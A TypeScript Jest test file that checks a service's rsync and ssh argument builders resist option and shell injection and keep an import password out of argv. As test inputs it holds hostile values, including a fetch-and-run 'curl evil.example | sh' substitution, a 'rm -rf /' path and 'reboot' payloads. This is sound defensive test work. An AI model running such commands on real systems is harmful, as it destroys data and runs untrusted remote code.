/**
 * The rsync image import's argument vectors (services/upstreamFileImport/sshArgs.ts).
 *
 * What must hold, whatever an operator types:
 *  - no value becomes an OPTION: every operator value sits after `--` (rsync, ssh-keyscan) and
 *    the ssh command rsync runs is made of fixed tokens only;
 *  - nothing reaches a SHELL: the vectors are arrays handed to spawn(shell: false) — and the
 *    `-e` string, which rsync itself splits on whitespace, refuses any token that is not one
 *    safe word;
 *  - the PASSWORD never appears in any vector: it travels only as sshpass's SSHPASS variable.
 */
import {
  buildKeyscanArgs,
  buildRsyncArgs,
  buildSshCommand,
  childEnv,
  hostKeyAlgorithmsFor,
  knownHostsLine,
  remoteSpec,
  rsyncCommand,
  sshCommandString,
} from "../../../services/upstreamFileImport/sshArgs";
import { HOST_KEY_ALIAS } from "../../../constants/upstreamFileImport";
import { environment } from "../../../config/env";

const penv = environment();

const PASSWORD = "Sup3r-s3cret;$(reboot)`id`|&";

const sshTokens = (authMethod: "password" | "key"): string[] =>
  buildSshCommand({
    port: 2222,
    knownHostsPath: "/srv/import/runs/abc/known_hosts",
    hostKeyType: "ssh-ed25519",
    authMethod,
    identityPath: authMethod === "key" ? "/srv/import/runs/abc/id_source" : null,
  });

describe("buildSshCommand — fixed, hardened ssh options", () => {
  it("pins the host key under the fixed alias, refuses any other, and loads no ssh_config", () => {
    const tokens = sshTokens("password");
    expect(tokens.slice(0, 5)).toEqual(["ssh", "-F", "/dev/null", "-p", "2222"]);
    for (const option of [
      "StrictHostKeyChecking=yes",
      "UserKnownHostsFile=/srv/import/runs/abc/known_hosts",
      "GlobalKnownHostsFile=/dev/null",
      `HostKeyAlias=${HOST_KEY_ALIAS}`,
      "HostKeyAlgorithms=ssh-ed25519",
      "UpdateHostKeys=no",
      "ProxyCommand=none",
      "ProxyJump=none",
      "ForwardAgent=no",
      "ClearAllForwardings=yes",
      "PermitLocalCommand=no",
      "IdentityAgent=none",
    ]) {
      expect(tokens).toContain(option);
      expect(tokens[tokens.indexOf(option) - 1]).toBe("-o");
    }
  });

  it("password auth goes through sshpass's prompt: BatchMode off, no public key", () => {
    const tokens = sshTokens("password");
    expect(tokens).toContain("BatchMode=no");
    expect(tokens).toContain("PubkeyAuthentication=no");
    expect(tokens).not.toContain("-i");
  });

  it("key auth: BatchMode on, publickey only, the identity file named", () => {
    const tokens = sshTokens("key");
    expect(tokens).toContain("BatchMode=yes");
    expect(tokens).toContain("PasswordAuthentication=no");
    expect(tokens.slice(-2)).toEqual(["-i", "/srv/import/runs/abc/id_source"]);
  });

  it("key auth without an identity file is a programming error", () => {
    expect(() =>
      buildSshCommand({ port: 22, knownHostsPath: "/k", hostKeyType: "ssh-ed25519", authMethod: "key" }),
    ).toThrow("identity file");
  });

  it("uses the default connect timeout unless one is given", () => {
    expect(sshTokens("key")).toContain("ConnectTimeout=15");
    expect(
      buildSshCommand({ port: 22, knownHostsPath: "/k", hostKeyType: "ssh-rsa", authMethod: "password", connectTimeoutSec: 7 }),
    ).toContain("ConnectTimeout=7");
  });

  it("an RSA key is accepted as SHA-2 signatures only", () => {
    expect(hostKeyAlgorithmsFor("ssh-rsa")).toBe("rsa-sha2-512,rsa-sha2-256");
    expect(hostKeyAlgorithmsFor("ecdsa-sha2-nistp256")).toBe("ecdsa-sha2-nistp256");
  });
});

describe("sshCommandString — the one string rsync splits", () => {
  it("joins safe tokens", () => {
    expect(sshCommandString(sshTokens("key"))).toMatch(/^ssh -F \/dev\/null -p 2222 -o StrictHostKeyChecking=yes /);
  });

  it.each([["has space"], ["quote'd"], ['dq"'], ["back\\slash"], ["semi;colon"], ["$(x)"], ["`x`"], ["a|b"], ["new\nline"], [""]])(
    "refuses a token that is not one safe word: %j",
    (token) => {
      expect(() => sshCommandString(["ssh", token])).toThrow("single safe word");
    },
  );
});

describe("remoteSpec", () => {
  it("names user, address and a directory with a trailing slash", () => {
    expect(remoteSpec("importer", "203.0.113.7", "/var/www/uploads/foto_sn")).toBe("importer@203.0.113.7:/var/www/uploads/foto_sn/");
    expect(remoteSpec("importer", "203.0.113.7", "/x/")).toBe("importer@203.0.113.7:/x/");
  });

  it("brackets an IPv6 address", () => {
    expect(remoteSpec("u", "2001:db8::7", "/p")).toBe("u@[2001:db8::7]:/p/");
  });
});

describe("buildRsyncArgs", () => {
  const base = {
    sshCommand: "ssh -F /dev/null",
    source: "u@203.0.113.7:/p/foto_depan/",
    destination: "/staging/foto_depan/",
    ioTimeoutSec: 300,
  };

  it("estimate: a dry run with stats; the paths after --", () => {
    const args = buildRsyncArgs({ ...base, mode: "estimate" });
    expect(args).toContain("--dry-run");
    expect(args).toContain("--stats");
    expect(args).not.toContain("--partial");
    expect(args.slice(-3)).toEqual(["--", base.source, base.destination]);
  });

  it("transfer: resumable, hardened receiving side, progress, bandwidth limit", () => {
    const args = buildRsyncArgs({ ...base, mode: "transfer", bandwidthLimitKbps: 2048, partialDir: ".p" });
    for (const flag of [
      "--protect-args",
      "--no-links",
      "--no-devices",
      "--no-specials",
      "--no-perms",
      "--chmod=D700,F600",
      "--max-size=64m",
      "--timeout=300",
      "--partial",
      "--partial-dir=.p",
      "--info=progress2",
      "--bwlimit=2048",
    ]) {
      expect(args).toContain(flag);
    }
    expect(args).not.toContain("--dry-run");
    expect(args.some((a) => a.startsWith("--rsync-path"))).toBe(false);
    expect(args[args.indexOf("-e") + 1]).toBe(base.sshCommand);
  });

  it("transfer without a limit or partial dir uses the defaults", () => {
    const args = buildRsyncArgs({ ...base, mode: "transfer", bandwidthLimitKbps: null });
    expect(args).toContain("--partial-dir=.rsync-partial");
    expect(args.some((a) => a.startsWith("--bwlimit"))).toBe(false);
  });

  it.each([
    ["an option-shaped path", "-e sh -c reboot"],
    ["a shell payload", "/x; rm -rf / #"],
    ["a command substitution", "$(curl evil.example | sh)"],
  ])("%s stays ONE argument after -- (never parsed as an option or by a shell)", (_label, payload) => {
    const source = remoteSpec("importer", "203.0.113.7", payload);
    const args = buildRsyncArgs({ ...base, mode: "transfer", source });
    const dashDash = args.indexOf("--");
    expect(args[dashDash + 1]).toBe(source);
    expect(args.filter((a) => a === source)).toHaveLength(1);
    expect(args.slice(0, dashDash)).not.toContain(source);
  });
});

describe("buildKeyscanArgs", () => {
  it("scans the three accepted types; the address after --", () => {
    expect(buildKeyscanArgs("-oProxyCommand=x", 22, 10)).toEqual(["-T", "10", "-p", "22", "-t", "ed25519,ecdsa,rsa", "--", "-oProxyCommand=x"]);
  });
});

describe("rsyncCommand and childEnv — where the password goes", () => {
  it("password auth runs sshpass -e (the password from SSHPASS), never the password in argv", () => {
    const args = buildRsyncArgs({ mode: "transfer", sshCommand: sshCommandString(sshTokens("password")), source: "u@h:/p/", destination: "/d/", ioTimeoutSec: 5 });
    const command = rsyncCommand("password", args);
    expect(command.file).toBe("sshpass");
    expect(command.args.slice(0, 2)).toEqual(["-e", "rsync"]);
    expect(command.args.join("\u0000")).not.toContain(PASSWORD);
    expect(command.args.some((a) => a === "-p")).toBe(false);
    const env = childEnv("/run/home", PASSWORD);
    expect(env["SSHPASS"]).toBe(PASSWORD);
  });

  it("key auth runs rsync itself, and the environment has no SSHPASS", () => {
    expect(rsyncCommand("key", ["--x"])).toEqual({ file: "rsync", args: ["--x"] });
    expect(childEnv("/run/home")).not.toHaveProperty("SSHPASS");
    expect(childEnv("/run/home", null)).not.toHaveProperty("SSHPASS");
  });

  it("the child environment is built from nothing: none of this process's variables", () => {
    penv["UPSTREAM_TEST_LEAK_PROBE"] = "must-not-leak";
    try {
      const env = childEnv("/run/home", "pw");
      expect(Object.keys(env).sort()).toEqual(["HOME", "LANG", "LC_ALL", "PATH", "SSHPASS"]);
      expect(Object.values(env)).not.toContain("must-not-leak");
    } finally {
      delete penv["UPSTREAM_TEST_LEAK_PROBE"];
    }
  });
});

describe("knownHostsLine", () => {
  it("is exactly one line: the alias, the type, the key", () => {
    expect(knownHostsLine({ type: "ssh-ed25519", key: "AAAAC3NzaC1lZDI1NTE5AAAAIBase64" })).toBe(
      `${HOST_KEY_ALIAS} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBase64\n`,
    );
  });
});
